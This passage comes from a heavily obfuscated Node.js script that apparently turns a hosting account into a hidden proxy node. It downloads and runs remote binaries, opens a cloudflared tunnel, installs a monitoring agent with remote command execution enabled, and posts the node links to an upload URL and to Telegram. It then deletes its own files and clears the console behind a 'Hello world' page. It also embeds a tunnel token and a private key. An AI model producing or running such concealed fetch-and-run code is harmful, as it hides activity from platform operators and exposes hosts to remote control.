        ((_0x17b766 = _0x197b5f[0x0]), console[_0xb47d85(0x167)]('ArgoDomain:', _0x17b766), await generateLinks(_0x17b766))
      else {
        ;(console[_0xb47d85(0x167)](_0xb47d85(0x244)), fs[_0xb47d85(0x13c)](path[_0xb47d85(0x19d)](FILE_PATH, 'boot.log')))
        async function _0x1b9779() {
          const _0x515021 = _0xb47d85
          try {
            process[_0x515021(0x1c6)] === _0x515021(0x234)
              ? await exec('taskkill\x20/f\x20/im\x20' + botName + '.exe\x20>\x20nul\x202>&1')
              : await exec(_0x515021(0x1d1) + botName[_0x515021(0x1a2)](0x0) + ']' + botName[_0x515021(0x170)](0x1) + _0x515021(0x225))
          } catch (_0x3d82af) {}
        }
        ;(_0x1b9779(), await new Promise((_0x2bb812) => setTimeout(_0x2bb812, 0xbb8)))
        const _0x1977c4 =
          'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22' +
          path[_0xb47d85(0x19a)](bootLogPath) +
          '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:' +
          ARGO_PORT
        try {
          ;(await exec('nohup\x20\x22' + path[_0xb47d85(0x19a)](botPath) + '\x22\x20' + _0x1977c4 + _0xb47d85(0x207)),
            console[_0xb47d85(0x167)](botName + _0xb47d85(0x205)),
            await new Promise((_0x329365) => setTimeout(_0x329365, 0x1770)),
            await extractDomains())
        } catch (_0xf6fcf6) {
          console[_0xb47d85(0x1f0)](_0xb47d85(0x1af) + _0xf6fcf6)
        }
      }
    } catch (_0x575b87) {
      console['error'](_0xb47d85(0x174), _0x575b87)
    }
}
async function getMetaInfo() {
  const _0x2b6d82 = _0x235ba3
  try {
    const _0x4be70d = await axios['get'](_0x2b6d82(0x173), { headers: { 'User-Agent': _0x2b6d82(0x228), timeout: 0xbb8 } })
    if (_0x4be70d[_0x2b6d82(0x19b)] && _0x4be70d[_0x2b6d82(0x19b)][_0x2b6d82(0x23a)] && _0x4be70d[_0x2b6d82(0x19b)]['isp'])
      return (_0x4be70d[_0x2b6d82(0x19b)][_0x2b6d82(0x23a)] + '-' + _0x4be70d[_0x2b6d82(0x19b)]['isp'])[_0x2b6d82(0x1c7)](/\s+/g, '_')
  } catch (_0x474b8b) {
    try {
      const _0xde1ef = await axios[_0x2b6d82(0x1a7)](_0x2b6d82(0x238), { headers: { 'User-Agent': _0x2b6d82(0x228), timeout: 0xbb8 } })
      if (
        _0xde1ef[_0x2b6d82(0x19b)] &&
        _0xde1ef[_0x2b6d82(0x19b)][_0x2b6d82(0x1df)] === _0x2b6d82(0x22c) &&
        _0xde1ef[_0x2b6d82(0x19b)][_0x2b6d82(0x17d)] &&
        _0xde1ef['data'][_0x2b6d82(0x1b8)]
      )
        return (_0xde1ef['data'][_0x2b6d82(0x17d)] + '-' + _0xde1ef[_0x2b6d82(0x19b)]['org'])[_0x2b6d82(0x1c7)](/\s+/g, '_')
    } catch (_0x5df093) {}
  }
  return _0x2b6d82(0x1bb)
}
async function getServerIP() {
  const _0x1e0c53 = _0x235ba3
  let _0x1a92b9 = ''
  try {
    const _0x572ac3 = await axios[_0x1e0c53(0x1a7)](_0x1e0c53(0x1d7), { timeout: 0xbb8 })
    _0x1a92b9 = _0x572ac3['data'][_0x1e0c53(0x154)]()
  } catch (_0x1e2db7) {
    try {
      _0x1a92b9 = execSync(_0x1e0c53(0x223))['toString']()[_0x1e0c53(0x154)]()
    } catch (_0x13852a) {
      try {
        const _0xd04353 = await axios[_0x1e0c53(0x1a7)](_0x1e0c53(0x237), { timeout: 0xbb8 })
        _0x1a92b9 = '[' + _0xd04353[_0x1e0c53(0x19b)][_0x1e0c53(0x154)]() + ']'
      } catch (_0x520c76) {
        try {
          _0x1a92b9 = '[' + execSync(_0x1e0c53(0x13d))[_0x1e0c53(0x1db)]()['trim']() + ']'
        } catch (_0x2968a2) {
          console[_0x1e0c53(0x1f0)]('Failed\x20to\x20get\x20IP\x20address:', _0x2968a2[_0x1e0c53(0x24a)])
        }
      }
    }
  }
  return _0x1a92b9
}
async function generateLinks(_0xe199b) {
  const _0x1ed630 = await getMetaInfo(),
    _0x11454a = NAME ? NAME + '-' + _0x1ed630 : _0x1ed630,
    _0x2c5592 = await getServerIP()
  return new Promise((_0x410828) => {
    setTimeout(() => {
      const _0x15edd2 = _0x5cf0,
        _0x57d3aa = {
          v: '2',
          ps: '' + _0x11454a,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: 'auto',
          net: 'ws',
          type: _0x15edd2(0x1f9),
          host: _0xe199b,
          path: _0x15edd2(0x189),
          tls: 'tls',
          sni: _0xe199b,
          alpn: '',
          fp: _0x15edd2(0x20d)
        }
      let _0x4bb04d =
        _0x15edd2(0x1c9) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x15edd2(0x248) +
        _0xe199b +
        _0x15edd2(0x21e) +
        _0xe199b +
        _0x15edd2(0x17f) +
        _0x11454a +
        '\x0a\x0avmess://' +
        Buffer[_0x15edd2(0x1ac)](JSON['stringify'](_0x57d3aa))[_0x15edd2(0x1db)](_0x15edd2(0x190)) +
        _0x15edd2(0x14d) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        '?security=tls&sni=' +
        _0xe199b +
        _0x15edd2(0x21e) +
        _0xe199b +
        _0x15edd2(0x13a) +
        _0x11454a +
        _0x15edd2(0x1c5)
      if (isValidPort(HY2_PORT)) {
        const _0x464ebd = getCertificateFingerprint(certPath),
          _0x5131e9 = _0x464ebd ? '&pinSHA256=' + encodeURIComponent(_0x464ebd) : '',
          _0x627962 = _0x15edd2(0x1a9) + UUID + '@' + _0x2c5592 + ':' + HY2_PORT + _0x15edd2(0x224) + _0x5131e9 + '#' + _0x11454a
        _0x4bb04d += _0x627962
      }
      if (isValidPort(REALITY_PORT)) {
        const _0x42ef7b =
          _0x15edd2(0x1c9) +
          UUID +
          '@' +
          _0x2c5592 +
          ':' +
          REALITY_PORT +
          '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=' +
          publicKey +
          _0x15edd2(0x15a) +
          _0x11454a
        _0x4bb04d += _0x42ef7b
      }
      if (isValidPort(S5_PORT)) {
        const _0x45c41a = Buffer[_0x15edd2(0x1ac)](UUID[_0x15edd2(0x170)](0x0, 0x8) + ':' + UUID[_0x15edd2(0x229)](-0xc))['toString'](
            _0x15edd2(0x190)
          ),
          _0x387244 = _0x15edd2(0x21f) + _0x45c41a + '@' + _0x2c5592 + ':' + S5_PORT + '#' + _0x11454a
        _0x4bb04d += _0x387244
      }
      ;(console['log'](Buffer[_0x15edd2(0x1ac)](_0x4bb04d)[_0x15edd2(0x1db)](_0x15edd2(0x190))),
        fs[_0x15edd2(0x1ba)](subPath, Buffer[_0x15edd2(0x1ac)](_0x4bb04d)[_0x15edd2(0x1db)](_0x15edd2(0x190))),
        fs[_0x15edd2(0x1ba)](listPath, _0x4bb04d, _0x15edd2(0x20b)),
        console[_0x15edd2(0x167)](FILE_PATH + _0x15edd2(0x1f3)),
        (subContent = Buffer['from'](_0x4bb04d)[_0x15edd2(0x1db)](_0x15edd2(0x190))),
        uploadNodes(),
        _0x410828(_0x4bb04d))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x1c94e0 = _0x235ba3
  if (UPLOAD_URL) {
    if (!fs[_0x1c94e0(0x1d2)](listPath)) return
    const _0x169fb1 = fs[_0x1c94e0(0x212)](listPath, _0x1c94e0(0x1f7)),
      _0xadf883 = _0x169fb1[_0x1c94e0(0x1ab)]('\x0a')[_0x1c94e0(0x214)]((_0x2af053) => /(vless|vmess|trojan|hysteria2|socks):\/\//['test'](_0x2af053))
    if (_0xadf883['length'] === 0x0) return
    const _0x2b7e4e = JSON['stringify']({ nodes: _0xadf883 })
    try {
      const _0x3069ad = await axios[_0x1c94e0(0x1cb)](UPLOAD_URL + _0x1c94e0(0x14a), _0x2b7e4e, { headers: { 'Content-Type': 'application/json' } })
      return _0x3069ad && _0x3069ad['status'] === 0xc8 ? (console[_0x1c94e0(0x167)](_0x1c94e0(0x200)), _0x3069ad) : null
    } catch (_0x4b7f0f) {
      return null
    }
  } else return
}
function cleanFiles() {
  setTimeout(() => {
    const _0xa68c83 = _0x5cf0,
      _0xae4194 = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0xae4194[_0xa68c83(0x180)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0xae4194['push'](phpPath)
    process['platform'] === 'win32'
      ? exec(_0xa68c83(0x221) + _0xae4194['join']('\x20') + '\x20>\x20nul\x202>&1', (_0x6f0c9) => {
          const _0x335540 = _0xa68c83
          ;(console['clear'](), alwaysLog(_0x335540(0x19f)), console['log'](_0x335540(0x191)))
        })
      : exec(_0xa68c83(0x23b) + _0xae4194[_0xa68c83(0x19d)]('\x20') + _0xa68c83(0x18f), (_0x4fd0ea) => {
          const _0x4a498b = _0xa68c83
          ;(console[_0x4a498b(0x1cf)](), alwaysLog(_0x4a498b(0x19f)), console[_0x4a498b(0x167)](_0x4a498b(0x191)))
        })
  }, 0x15f90)
}
cleanFiles()
async function sendTelegram() {
  const _0x1d952a = _0x235ba3
  if (!BOT_TOKEN || !CHAT_ID) {
    console[_0x1d952a(0x167)](_0x1d952a(0x1b3))
    return
  }
  try {
    const _0x316772 = fs[_0x1d952a(0x212)](subPath, _0x1d952a(0x20b)),
      _0x48ecaf = _0x1d952a(0x195) + BOT_TOKEN + _0x1d952a(0x1cc),
      _0xef4ab3 = NAME[_0x1d952a(0x1c7)](/[_*\[\]()~`>#+=|{}.!-]/g, '\x5c$&'),
      _0x177945 = { chat_id: CHAT_ID, text: '**' + _0xef4ab3 + _0x1d952a(0x20e) + _0x316772 + _0x1d952a(0x14f), parse_mode: _0x1d952a(0x182) }
    ;(await axios['post'](_0x48ecaf, null, { params: _0x177945 }), console['log']('Telegram\x20message\x20sent\x20successfully'))
  } catch (_0x1514c3) {
    console['error']('Failed\x20to\x20send\x20Telegram\x20message:', _0x1514c3[_0x1d952a(0x24a)])
  }
}
async function startserver() {
  const _0x16aebe = _0x235ba3
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram())
  } catch (_0x275a2c) {
    console[_0x16aebe(0x1f0)](_0x16aebe(0x179), _0x275a2c)
  }
}
startserver()[_0x235ba3(0x1a0)]((_0x5303a7) => {
  const _0x466f77 = _0x235ba3
  console[_0x466f77(0x1f0)](_0x466f77(0x203), _0x5303a7)
})
const server = http[_0x235ba3(0x192)](async (_0x2f9bc3, _0x17c9e8) => {
  const _0x55aaf9 = _0x235ba3,
    _0x153e5d = _0x2f9bc3[_0x55aaf9(0x1bf)][_0x55aaf9(0x1ab)]('?')[0x0]
  if (_0x153e5d === '/' + SUB_PATH) {
    if (subContent) (_0x17c9e8[_0x55aaf9(0x1ae)](0xc8, { 'Content-Type': _0x55aaf9(0x22e) }), _0x17c9e8[_0x55aaf9(0x1f5)](subContent))
    else
      try {
        const _0x45ed57 = fs[_0x55aaf9(0x212)](subPath, _0x55aaf9(0x1f7))
        ;(_0x17c9e8[_0x55aaf9(0x1ae)](0xc8, { 'Content-Type': _0x55aaf9(0x22e) }), _0x17c9e8[_0x55aaf9(0x1f5)](_0x45ed57))
      } catch (_0xec66c7) {
        ;(_0x17c9e8['writeHead'](0x1f7, { 'Content-Type': _0x55aaf9(0x22e) }), _0x17c9e8['end'](_0x55aaf9(0x219)))
      }
    return
  }
  if (_0x153e5d === '/') {
    try {
      const _0x4dac5a = path[_0x55aaf9(0x19d)](__dirname, _0x55aaf9(0x1ce)),
        _0x4b195b = await fs[_0x55aaf9(0x1f8)][_0x55aaf9(0x15b)](_0x4dac5a, _0x55aaf9(0x20b))
      ;(_0x17c9e8[_0x55aaf9(0x1ae)](0xc8, { 'Content-Type': _0x55aaf9(0x19e) }), _0x17c9e8[_0x55aaf9(0x1f5)](_0x4b195b))
    } catch (_0x17b068) {
      ;(_0x17c9e8[_0x55aaf9(0x1ae)](0xc8, { 'Content-Type': _0x55aaf9(0x19e) }), _0x17c9e8[_0x55aaf9(0x1f5)](_0x55aaf9(0x151)))
    }
    return
  }
  ;(_0x17c9e8[_0x55aaf9(0x1ae)](0x194, { 'Content-Type': _0x55aaf9(0x22e) }), _0x17c9e8[_0x55aaf9(0x1f5)]('Not\x20Found'))
})
server[_0x235ba3(0x21a)](PORT, () => alwaysLog('http\x20server\x20is\x20running\x20on\x20' + PORT + '!'))
function _0x1cdb() {
  const _0x1cc7cf = [
    'CFPORT',
    '/vmess-argo?ed=2560',
    'hysteria-in',
    'NAME',
    'private.key',
    '8443',
    'PrivateKey:\x20',
    '\x20>/dev/null\x202>&1',
    'base64',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    'createServer',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'hex',
    'https://api.telegram.org/bot',
    '\x22\x20run',
    'nohup\x20\x22',
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'https://arm64.oooen.com',
    'resolve',
    'data',
    'abcdefghijklmnopqrstuvwxyz',
    'join',
    'text/html;\x20charset=utf-8',
    'App\x20is\x20running',
    'catch',
    'arm',
    'charAt',
    '.download',
    'chmodSync',
    'env',
    'Public\x20Key:',
    'get',
    'generateKeyPairSync',
    '\x0ahysteria2://',
    'renameSync',
    'split',
    'from',
    'unlink',
    'writeHead',
    'Error\x20executing\x20command:\x20',
    'application/json',
    'pop',
    'blackhole',
    'TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG',
    'https://arm64.ssss.nyc.mn',
    '8DHBwNs',
    'child_process',
    'publicKey',
    'org',
    'fileUrls',
    'writeFileSync',
    'Unknown',
    '\x0aclient_secret:\x20',
    'axios',
    'BOT_TOKEN',
    'url',
    '-----END\x20CERTIFICATE-----\x0a',
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiNGE3M2UxYTctNTQyOC00MTBjLWE3ZDctZWQ3YzU3ZWJjZDQ1IiwicyI6Ik1qYzVaV05sWmpndFpURTRZaTAwTXpJMExXSTNNVEl0WkRjMFptUTFOV00xTUdaaSJ9',
    '377610CBvOCc',
    'ARGO_PORT',
    'hysteria',
    '\x0a\x20\x20\x20\x20',
    'platform',
    'replace',
    'vmess',
    '\x0avless://',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels',
    'post',
    '/sendMessage',
    'vless-ws-in',
    'index.html',
    'clear',
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a',
    'pkill\x20-f\x20\x22[',
    'existsSync',
    '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
    'mkdirSync',
    'PORT',
    'openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22',
    'http://ipv4.ip.sb',
    'npm\x20running\x20error:\x20',
    '800',
    '2083',
    'toString',
    'now',
    '2053',
    'SHOW_LOG',
    'status',
    'UPLOAD_URL',
    'createWriteStream',
    'forEach',
    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
    '2ZoHtPv',
    'www.iij.ad.jp',
    'freedom',
    'update',
    'createHash',
    'tls',
    '/v1',
    '\x20failed:\x20',
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
    'mfa.gov.ua',
    'sha256',
    'Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20',
    'error',
    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
    'random',
    '/sub.txt\x20saved\x20successfully',
    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
    'end',
    'all',
    'utf-8',
    'promises',
    'none',
    'ignore',
    'Retrying\x20',
    'vless',
    'trojan',
    'ARGO_AUTH',
    'vless-in',
    'Nodes\x20uploaded\x20successfully',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
    'Empowerment\x20success\x20for\x20',
    'Unhandled\x20error\x20in\x20startserver:',
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a',
    '\x20is\x20running',
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a',
    '\x20>/dev/null\x202>&1\x20&',
    '/config.json\x20>/dev/null\x202>&1\x20&',
    'BggqhkjOPQMBBw==\x0a',
    'aarch64',
    'utf8',
    'boot.log',
    'firefox',
    '节点推送**\x0a```',
    '506pSwJpk',
    'statSync',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    'readFileSync',
    '\x0a\x20\x20credentials-file:\x20',
    'filter',
    '\x20-c\x20',
    'S5_PORT',
    'Error\x20downloading\x20files:',
    'includes',
    'Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.',
    'listen',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    'config.json',
    'key.txt',
    '&fp=firefox&type=ws&host=',
    '\x0asocks://',
    'www.iij.ad.jp:443',
    'del\x20/f\x20/q\x20',
    '/api/delete-nodes',
    'curl\x20-sm\x203\x20ipv4.ip.sb',
    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
    '\x22\x20>\x20/dev/null\x202>&1',
    'util',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
    'Mozilla/5.0',
    'slice',
    'pkcs8',
    '-----BEGIN\x20CERTIFICATE-----\x0a',
    'success',
    '2087',
    'text/plain;\x20charset=utf-8',
    'digest',
    '1673IpnvOY',
    'NEZHA_PORT',
    'fileName',
    'test',
    'win32',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
    '72tHMYgQ',
    'http://ipv6.ip.sb',
    'http://ip-api.com/json',
    'then',
    'country_code',
    'rm\x20-rf\x20',
    'http',
    'REALITY_PORT',
    'true',
    'quic',
    'ARGO_DOMAIN',
    'export',
    'toUpperCase',
    'length',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    '\x0aPublicKey:\x20',
    'der',
    '/web',
    '?encryption=none&security=tls&sni=',
    'stream',
    'message',
    'toLowerCase',
    '18df3378-491f-4083-8f06-13a8b40e39f5',
    '-----END\x20EC\x20PARAMETERS-----\x0a',
    'vless-tcp-in',
    'UUID',
    'has',
    'subarray',
    'stdout',
    'NEZHA_SERVER',
    'https://amd64.ssss.nyc.mn',
    'disable',
    'basename',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    '539976vptFzR',
    'unlinkSync',
    'curl\x20-sm\x203\x20ipv6.ip.sb',
    'path',
    'tunnel.yml',
    '\x20-p\x20',
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a',
    'inbounds',
    '127.0.0.1',
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
    '302154sMsXpK',
    '\x22\x20-subj\x20\x22/CN=bing.com\x22',
    '13506zDguWe',
    '2096',
    '/api/add-nodes',
    'trojan-ws-in',
    'config.yaml',
    '\x0a\x0atrojan://',
    '423908OiozRJ',
    '```',
    'pipe',
    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
    'direct',
    'false',
    'trim',
    '\x0a\x20\x20tunnel:\x20',
    '3126345wRnKnF',
    'string',
    'arch',
    'NEZHA_KEY',
    '&type=tcp&headerType=none#',
    'readFile',
    'vless-fallback-in',
    'xtls-rprx-vision',
    '/dev/null',
    'sub.txt',
    '/bot',
    'openssl\x20version',
    '443',
    'proxy',
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a',
    'Private\x20Key:',
    '/vless-argo',
    'log',
    'match',
    'ARGO_DOMAIN:',
    'base64url',
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a',
    'spki',
    'web\x20running\x20error:\x20',
    'stringify',
    '/vmess-argo',
    'substring',
    '\x20successfully',
    '/agent',
    'https://api.ip.sb/geoip',
    'Error\x20reading\x20boot.log:',
    'close',
    'tunnel.json',
    'isFile',
    'php\x20running\x20error:\x20',
    'Error\x20in\x20startserver:',
    'Download\x20',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    'nohup\x20',
    'countryCode',
    'CHAT_ID',
    '&path=%2Fvless-argo%3Fed%3D2560#',
    'push',
    'block',
    'MarkdownV2',
    '80832rXNiMy',
    's5-in',
    'arm64',
    'tcp',
    '\x22\x20-out\x20\x22'
  ]
  _0x1cdb = function () {
    return _0x1cc7cf
  }
  return _0x1cdb()
}
